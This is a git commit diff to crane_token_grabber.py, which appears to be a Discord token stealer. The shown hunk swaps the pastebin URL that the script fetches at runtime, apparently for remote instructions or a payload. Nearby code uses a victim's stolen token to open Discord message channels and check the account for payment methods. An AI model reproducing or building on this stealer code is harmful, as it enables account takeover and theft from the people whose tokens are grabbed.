b95fd1f364495314a8aab2a26d4b8f17687c4926
ZeTo <81620817+LittleHacker151@users.noreply.github.com>
2021-11-18 15:00:03 +0200

    Update crane_token_grabber.py

--- crane_token_grabber.py
+++ crane_token_grabber.py
@@ -88,7 +88,7 @@ def getchat(token, uid):
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
     except:
         pass
-aress = 'https://pastebin.com/raw/qHzb4vEC'
+aress = 'https://pastebin.com/raw/ieFdqRts'
 seek = requests.get(aress).text  
 def has_payment_methods(token):
     try:
